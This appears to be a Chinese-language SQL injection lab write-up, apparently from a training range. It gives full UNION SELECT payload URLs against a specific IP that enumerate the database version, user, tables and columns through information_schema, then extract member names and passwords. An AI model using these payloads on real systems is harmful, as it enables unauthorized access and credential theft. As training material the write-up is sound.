四、如何判断注入点

select *from users WHERE id=1 and 1=2 LIMIT 0,1 错误

判断注入

猜解列名数量（字段数） order by x 猜错误与正常值

报错猜解

http://124.70.64.48:41807/new_list.php?id=1%20and%201=1%20union%20select%201,2,3,4

http://124.70.64.48:41807/new_list.php?id=1%20and%201=2%20union%20select%201,2,3,4

信息收集

数据库版本version() 5.7.22-0ubuntu0.16.04.1

数据库名字database() mozhe_Discuz_StormGroup

数据库用户user() root@localhost

操作系统 @@version_compile_os Linux

数据库名字database() 数据库版本version()

数据库用户user() @@version_compile_os

查询指定数据库mozhe_Discuz_StormGroup下的表名信息

http://124.70.64.48:41807/new_list.php?id=1 and 1=2 union select 1,table_name,3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’

查询table_name 从information_schema下的表名信息的表 条件是 数据库table_schema = 数据库名字database() 的 mozhe_Discuz_StormGroup

查询他的所有

http://124.70.64.48:41807/new_list.php?id=1 and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’

查询表名StormGroup_member下的列名信息

http://124.70.64.48:41807/new_list.php?id=1%20and%201=2%20union%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27StormGroup_member%27

查询指定数据

http://124.70.64.48:41807/new_list.php?id=1%20and%201=2%20union%20select%201,name,password,4%20from%20StormGroup_member

七、必要知识点

1.在MYSQL5.0以上版本中存在一个自带数据库名为 information_schema， 他是一个存储记录所有数据库名，表名，列名的数据库，也相当于可以通过查询他获取指定数据库下面的表名或列名信息。

2.符号“ . ”代表下一级，如xiao.user表示xiao数据库下的user表名

information_schema.tables; 记录所有表名信息的表

information_schema.columns; 记录所有列名信息的表

tables_name; 表名

column_name; 列名

tables_schema
